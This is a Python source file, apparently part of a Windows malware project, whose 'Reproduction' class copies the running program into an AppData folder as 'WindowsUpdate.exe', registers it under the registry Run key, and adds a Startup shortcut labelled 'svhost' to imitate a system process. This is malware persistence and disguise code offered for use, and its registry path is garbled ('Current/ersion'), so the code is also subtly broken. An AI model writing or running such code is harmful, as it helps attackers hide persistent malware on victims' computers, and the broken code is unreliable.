import os
import shutil
import sys
import winshell

from tools.code_execution import run_cmd_command


class Reproduction:
    def __init__(self):
        # It is not needed
        pass

    def copy_self_to_temp(self, new_exe_name='WindowsUpdate.exe'):
        """
        Copy the current executable to a temporary directory and inject it into the registry.

        Parameters:
            new_exe_name (str): The name of the new executable file (default is 'WindowsUpdate.exe').

        Returns:
            None

        Raises:
            Exception: If there is an error while copying the executable.
        """
        try:
            exe_path = sys.executable

            # Get the name of the executable
            # exe_name = os.path.basename(exe_path)

            # Get the temp directory in appdata
            temp_dir = os.path.join(os.getenv('APPDATA'), 'temp')

            # Check if the executable is already in the appdata folder
            if not exe_path.startswith(temp_dir):
                # Create the temp directory if it does not exist
                os.makedirs(temp_dir, exist_ok=True)

                # Define the destination path with the new name
                dest_path = os.path.join(temp_dir, f"{new_exe_name}.exe")

                # Copy the executable to the destination path and rename it
                shutil.copy2(exe_path, dest_path)

                print(f'Copied {exe_path} to {dest_path} as {new_exe_name}.exe')

                self.inject_to_registry(dest_path, new_exe_name)
        except Exception as e:
            print(f"Error copying executable: {e}")

    @staticmethod
    def inject_to_registry(dest_path, new_exe_name):
        """
        Injects a new executable into the Windows Registry as a startup item.

        Args:
            dest_path (str): The path of the executable file to be added as a startup item.
            new_exe_name (str): The name of the startup item.

        Returns:
            None

        Raises:
            Exception: If there is an error while injecting the executable into the Windows Registry.
        """
        try:
            # Build a Windows Registry command to add a startup item
            command = (
                # Specify the registry key to add the startup item to
                f'reg add "HKCU/Software/Microsoft/Windows/Current/ersion/Run" '
                f'/v {new_exe_name} '  # Set the name of the startup item (e.g., "WindowsUpdate")
                f'/t REG_SZ '  # Specify the data type for the registry value (REG_SZ for string)
                f'/d "{dest_path}" '  # Set the data value to be the path of the executable enclosed in double quotes
                f'/f'  # Force the update of the registry value even if it already exists ("/f" flag)
            )

            output = run_cmd_command(command)
            print(f"Tried to inject into REG. Output: {output}")
        except Exception as e:
            print(f"Error injecting into REG: {e}")

    @staticmethod
    def add_to_startup(path):
        """
        Create a shortcut to the given executable and add it to the Windows Startup folder.

        Args:
            path (str): Path to the executable to be added to startup.
        """
        # Get the Startup folder
        startup_folder = winshell.startup()

        # Get the name of the executable
        exe_name = os.path.basename(path)

        # Define the destination path for the shortcut
        dest_path = os.path.join(startup_folder, exe_name + '.lnk')

        # Create a shortcut
        winshell.CreateShortcut(
            Path=dest_path,
            Target=path,
            Icon=(path, 0),
            Description="svhost"
        )

        print(f'Added {path} to startup programs.')
